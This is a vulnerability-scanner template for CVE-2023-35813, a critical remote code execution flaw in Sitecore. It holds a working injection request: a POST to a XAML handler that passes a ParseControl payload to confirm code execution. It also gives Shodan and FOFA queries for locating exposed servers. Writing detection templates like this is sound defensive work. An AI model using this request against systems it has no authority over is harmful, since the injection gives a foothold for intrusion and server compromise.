id: CVE-2023-35813

info:
  name: Sitecore - Remote Code Execution
  author: DhiyaneshDk,iamnoooob
  severity: critical
  verified: true
  description: |
    Multiple Sitecore products allow remote code execution. This affects Experience Manager, Experience Platform, and Experience Commerce through 10.3.
    shodan: title:"Sitecore"
    fofa: title="Sitecore"
  reference:
    - https://support.sitecore.com/kb?id=kb_article_view\u0026sysparm_article=KB1002979
    - https://code-white.com/blog/exploiting-asp.net-templateparser-part-1/
    - https://nvd.nist.gov/vuln/detail/CVE-2023-35813
  tags: cve,cve2023,sitecore,rce
  created: 2023/10/12

set:
  randstr: randomLowercase(6)
  payload: |
    urlencode(`<%@Register
        TagPrefix = 'x'
        Namespace = 'System.Runtime.Remoting.Services'
        Assembly = 'System.Runtime.Remoting, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089'
    %>
    <x:RemotingService runat='server'
        Context-Response-ContentType='{{randstr}}'
    />`)
rules:
  r0:
    request:
      method: POST
      path: /sitecore_xaml.ashx/-/xaml/Sitecore.Xaml.Tutorials.Styles.Index
      body: |
        __ISEVENT=1&__SOURCE=&__PARAMETERS=ParseControl("{{payload}}")
    expression: |
      response.status == 200 &&
      response.headers["content-type"].contains(randstr) &&
      response.body.bcontains(b'commands') && 
      response.body.bcontains(b'command') && 
      response.body.bcontains(b'value')
expression: r0()
